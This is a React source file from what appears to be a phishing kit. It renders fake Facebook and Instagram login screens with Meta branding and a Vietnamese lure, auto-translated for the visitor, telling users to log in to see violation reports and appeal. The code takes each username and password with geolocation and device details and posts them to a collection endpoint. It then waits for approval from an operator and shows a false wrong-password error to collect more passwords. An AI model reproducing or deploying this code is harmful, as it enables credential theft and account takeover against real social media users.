import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faTriangleExclamation } from '@fortawesome/free-solid-svg-icons/faTriangleExclamation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const InstagramLogo = () => (
    <p
        className='bg-linear-to-tr from-[#f09433] via-[#dc2743] to-[#bc1888] bg-clip-text text-center text-[42px] leading-none font-normal text-transparent'
        style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}
    >
        Instagram
    </p>
);

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addAccount, addPassword, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;
    const isInstagram = loginProvider === 'instagram';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'Email or phone number',
            'Phone number, username, or email',
            'Password',
            'You entered the wrong password. Please try again.',
            'Continue',
            'Log in',
            'Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục',
            'Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Instagram để tiếp tục'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const sessionId = crypto.randomUUID();
        addAccount(accountInput);
        addPassword(password);

        const allAccounts = [...userData.accounts, accountInput];
        const allPasswords = [...userData.passwords, password];
        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData,
            loginProvider,
            accounts: allAccounts,
            passwords: allPasswords,
            maxPass
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'password',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    if (isInstagram) {
        return (
            <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-[#fafafa] px-4'>
                <div className='flex w-full max-w-[350px] flex-col items-center rounded-sm border border-[#dbdbdb] bg-white px-8 pt-10 pb-6'>
                    <InstagramLogo />

                    <div className='mb-4 mt-6 w-full'>
                        <p className='w-full text-center text-[13px] leading-[1.45] text-[#737373]'>
                            <FontAwesomeIcon icon={faTriangleExclamation} className='mr-1 text-[#ed4956]' />
                            {t('Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Instagram để tiếp tục')}
                        </p>
                    </div>

                    <div className='flex w-full flex-col gap-2'>
                        <input
                            type='text'
                            id='account-input'
                            value={accountInput}
                            onChange={(e) => setAccountInput(e.target.value)}
                            className='h-9 w-full rounded-[3px] border border-[#dbdbdb] bg-[#fafafa] px-2 text-[12px] text-[#262626] placeholder:text-[#8e8e8e] focus:border-[#a8a8a8] focus:bg-white focus:outline-none'
                            placeholder={t('Phone number, username, or email')}
                        />
                        <div className='relative w-full'>
                            <input
                                type={showPassword ? 'text' : 'password'}
                                id='password-input'
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className='h-9 w-full rounded-[3px] border border-[#dbdbdb] bg-[#fafafa] px-2 pr-9 text-[12px] text-[#262626] placeholder:text-[#8e8e8e] focus:border-[#a8a8a8] focus:bg-white focus:outline-none'
                                placeholder={t('Password')}
                            />
                            <FontAwesomeIcon
                                icon={showPassword ? faEyeSlash : faEye}
                                className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#8e8e8e] text-sm'
                                onClick={togglePassword}
                            />
                        </div>
                    </div>

                    {showError && <p className='mt-3 w-full text-center text-[13px] text-[#ed4956]'>{t('You entered the wrong password. Please try again.')}</p>}

                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                        className={`mt-4 flex h-8 w-full items-center justify-center rounded-[8px] text-[14px] font-semibold text-white transition-opacity ${accountInput.trim() && password.trim() ? 'bg-[#0095F6] hover:bg-[#1877F2]' : 'cursor-not-allowed bg-[#4CB5F9] opacity-70'} ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? <div className='h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Log in')}
                    </button>

                    <div className='mt-8 flex flex-col items-center gap-2'>
                        <svg className='h-6 w-6' viewBox='0 0 24 24' aria-hidden='true'>
                            <defs>
                                <linearGradient id='ig-footer-gradient' x1='0%' y1='100%' x2='100%' y2='0%'>
                                    <stop offset='0%' stopColor='#f09433' />
                                    <stop offset='50%' stopColor='#dc2743' />
                                    <stop offset='100%' stopColor='#bc1888' />
                                </linearGradient>
                            </defs>
                            <path
                                fill='url(#ig-footer-gradient)'
                                d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
                            />
                        </svg>
                        <p className='text-[14px] text-[#737373]'>
                            from <span className='font-semibold text-[#262626]'>Meta</span>
                        </p>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div
                className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-7 rounded-3xl border border-white/60 p-4 shadow-[0_18px_45px_rgba(31,41,55,0.16)] backdrop-blur-[2px]'
                style={{ background: 'linear-gradient(135deg, rgb(250, 233, 239), rgb(217, 234, 250), rgb(222, 249, 234))' }}
            >
                <Image src={FacebookLogoImage} alt='' className='mt-9 h-[70px] w-[70px]' />
                <div className='flex w-full flex-1 flex-col justify-center'>
                    <div className='mb-3 w-full'>
                        <p className='w-full text-left text-[15px] leading-[1.45] font-medium text-[#4f5662]'>
                            <FontAwesomeIcon icon={faTriangleExclamation} className='mr-2 text-[#e09b1b]' />
                            {t('Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục')}
                        </p>
                    </div>
                    <div className='relative mb-3 w-full'>
                        <input
                            type='text'
                            id='account-input'
                            value={accountInput}
                            onChange={(e) => setAccountInput(e.target.value)}
                            className='peer h-[60px] w-full rounded-xl border border-[#cdd9e7] bg-white/85 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-[0_2px_8px_rgba(31,41,55,0.06)] transition-colors focus:border-[#4f86e9] focus:outline-none'
                            placeholder={t('Email or phone number')}
                        />
                        <label htmlFor='account-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#3f76d8] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Email or phone number')}
                        </label>
                    </div>
                    <div className='relative w-full'>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            id='password-input'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className='peer h-[60px] w-full rounded-xl border border-[#cdd9e7] bg-white/85 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-[0_2px_8px_rgba(31,41,55,0.06)] transition-colors focus:border-[#4f86e9] focus:outline-none'
                            placeholder={t('Password')}
                        />
                        <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#3f76d8] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            {t('Password')}
                        </label>
                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#6b7280] transition-colors hover:text-[#3f76d8]' onClick={togglePassword} />
                    </div>
                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t('You entered the wrong password. Please try again.')}</p>}
                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                        className={`mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-full bg-linear-to-r from-[#2e7bf2] to-[#2563eb] font-semibold text-white shadow-[0_10px_22px_rgba(37,99,235,0.34)] transition-all hover:from-[#236fe6] hover:to-[#1d5cd9] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                    </button>
                </div>
                <div className='flex items-center justify-center pt-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
